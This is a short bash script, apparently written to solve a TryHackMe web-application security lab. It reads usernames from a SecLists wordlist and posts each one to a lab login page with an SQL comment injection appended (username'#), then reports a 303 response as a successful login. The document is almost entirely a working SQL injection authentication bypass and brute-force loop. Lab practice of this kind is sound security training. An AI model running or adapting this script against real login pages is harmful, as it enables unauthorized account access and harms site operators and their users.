#!/bin/bash
# used this script to brute force login page for - https://tryhackme.com/room/webappsec101
# names.txt - https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt 

file="names.txt"

while read -r line; do
    res=$(curl -d "username=$line'#&password=abcd" -w "%{http_code}\\n" -X POST -s -o /dev/null http://10.10.252.95/users/login.php)
    if [ $res -eq 303 ] ; then
    	echo -e "$line : $res SUCCESS!!!!"
    else
    	echo -e "$line : $res"
    fi
done <$file 
